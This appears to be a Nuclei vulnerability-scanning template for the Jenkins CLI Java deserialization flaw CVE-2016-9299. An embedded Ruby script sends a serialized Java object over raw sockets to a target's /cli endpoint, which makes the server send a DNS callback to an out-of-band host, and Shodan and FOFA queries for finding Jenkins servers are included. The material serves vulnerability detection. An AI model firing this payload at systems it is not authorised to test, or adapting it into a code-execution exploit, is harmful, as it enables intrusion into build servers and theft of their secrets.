code:
- engine:
  - rb
  - ruby
  matchers:
  - condition: and
    dsl:
    - contains(response,'hudson.remoting.UserRequest')
    - contains(interactsh_protocol, "dns")
    type: dsl
  source: "require 'socket'\nrequire 'base64'\n\n# Define environment variables for\
    \ host details (make sure they are properly set in your environment)\n$Hostname\
    \ = ENV['Hostname']\n$Host = ENV['Host']\n$Port = ENV['Port']\ninteractsh = (ENV['oast']).ljust(45,'/')\n\
    url_dns = \"aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74002d657761776a7763737778766b6a66737763716c69316673737632357271306438642e6f6173742e6f6e6c696e6574000071007e0005740004687474707078740034687474703a2f2f657761776a7763737778766b6a66737763716c69316673737632357271306438642e6f6173742e6f6e6c696e6578\"\
    \n$decoded_url_dns = [url_dns].pack(\"H*\")\n$decoded_url_dns = $decoded_url_dns.gsub!\
    \ \"ewawjwcswxvkjfswcqli1fssv25rq0d8d.oast.online\", interactsh\n\n# Step 1: Send\
    \ the download request without waiting for a response or closing the socket\n\
    def send_download_request(host, port)\n  download_socket = TCPSocket.new(host,\
    \ port)\n\n  download_request = <<~REQ\n    POST /cli HTTP/1.1\n    Host: #{$Hostname}\n\
    \    Session: 39382176-ac9c-4a00-bbc6-4172b3cf1e93\n    Side: download\n    Content-Type:\
    \ application/x-www-form-urlencoded\n    Content-Length: 0\\r\\n\n  REQ\n\n  #puts\
    \ \"Sending Download Request...\"\n  download_socket.write(download_request)\n\
    \n  # Return the open socket so we can read from it later\n  return download_socket\n\
    end\n\n# Step 2: Send the upload request\ndef send_upload_request(host, port)\n\
    \  socket = TCPSocket.new(host, port)\n\n  # Base64 decoded payload for upload\
    \ request\n  chunked_payload = \"<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAP4=\\\
    x00\\x00\\x00\\x00\\x01\\x55\" + $decoded_url_dns\n\n  upload_request = <<~REQ\n\
    \    POST /cli HTTP/1.1\n    Host: #{$Hostname}\n    Session: 39382176-ac9c-4a00-bbc6-4172b3cf1e93\n\
    \    Side: upload\n    Content-Type: application/octet-stream\n    Content-Length:\
    \ #{chunked_payload.bytesize}\\r\\n\n  REQ\n\n  #puts \"Sending Upload Request...\"\
    \n  socket.write(upload_request)\n\n  # Send the binary data (payload)\n  socket.write(chunked_payload)\n\
    \n  # Read and print the response for the upload request\n  response = socket.readpartial(1024)\n\
    \  #puts \"Received from server (upload response): #{response}\"\n\n  # Close\
    \ the socket for upload request\n  socket.close\nend\n\n# Step 3: After upload\
    \ request, read the download request's response\ndef read_download_response(socket)\n\
    \  #puts \"Reading Download Request Response...\"\n  response = socket.readpartial(1024)\n\
    \  socket.close\n  response\n\nend\n\n# Combined steps to perform the operations\
    \ in the required order\n# Step 1: Send download request (don't wait for response,\
    \ keep the socket open)\ndownload_socket = send_download_request($Host, $Port)\n\
    \n# Step 2: Send upload request\nsend_upload_request($Host, $Port)\n\n# Print\
    \ the download response\nputs read_download_response(download_socket)\n"
id: CVE-2016-9299
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:jenkins:jenkins:*:*:*:*:lts:*:*:*
    cve-id: CVE-2016-9299
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-90
    epss-percentile: 0.99357
    epss-score: 0.86028
  description: 'The remoting module in Jenkins before 2.32 and LTS before 2.19.3 allows
    remote attackers to execute arbitrary code via a crafted serialized Java object,
    which triggers an LDAP query to a third-party server.

    '
  impact: 'Attackers can execute arbitrary code through Java deserialization, potentially
    leading to complete Jenkins server compromise and unauthorized access to all build
    systems and secrets.

    '
  metadata:
    fofa-query: icon_hash=81586312
    max-request: 1
    product: jenkins
    shodan-query: product:"jenkins"
    vendor: jenkins
    verified: true
  name: Jenkins CLI - HTTP Java Deserialization
  reference:
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/misc/jenkins_ldap_deserialize.rb
  - https://nvd.nist.gov/vuln/detail/CVE-2016-9299
  remediation: 'Update Jenkins to version 2.32 or LTS 2.19.3 or later that fixes the
    deserialization vulnerability.

    '
  severity: critical
  tags: cve,cve2016,rce,deserialization,vkev,vuln
variables:
  oast: '{{interactsh-url}}'
